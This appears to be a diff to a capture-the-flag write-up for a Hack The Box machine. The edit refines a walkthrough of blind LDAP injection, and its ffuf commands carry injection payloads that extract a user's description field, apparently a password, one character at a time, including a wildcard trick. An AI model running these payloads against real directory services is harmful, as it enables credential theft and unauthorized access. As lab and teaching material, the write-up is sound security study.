@@ -529,7 +529,7 @@ userAccountControl      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 
 userPrincipalName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 65ms]
 ```
 
-There seem to be a lot of parameteres to test. We can brute-forcing one-by-one and see what we get. Since it is common for the `description` field to hold interesting information we can start with that. 
+There seem to be a lot of attributes to test. We can brute-forcing one-by-one and see what we get. Since it is common for the `description` field to hold interesting information we can start with that. 
 
 We can perform the LDAP Injection manually by using a tool like `fuff` to fuzz it. As shown below, we get the first character (`9`) as a response, which we can then add to the same command and get the second character (`7`), and so on:
 
@@ -572,8 +572,16 @@ $ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(obje
 
 l                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
 
-# here it outputs nothing, so we can infer that a special character exists
-# after trying some, `*` seems to do the trick
+$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtlFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
+
+                        [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
+```
+
+While fuzzing using the string `97NTtlFUZZ*` it outputs nothing. That means either that the password is this, i.e, `97NTtl`, or there is a special character that cannot be interpreterted as a "simple" character. For instance, [asterisk (`*`)](https://lgfang.github.io/computer/2021/12/15/ldap-search-wildcard) is used as a wildcard almost everywhere, such as regex, bash, and LDAP search filter, among others. 
+
+So we can try putting manually such characters, until we get something back. In this case, `*` seems to do the trick:
+
+```bash
 $ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8
 
 4                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
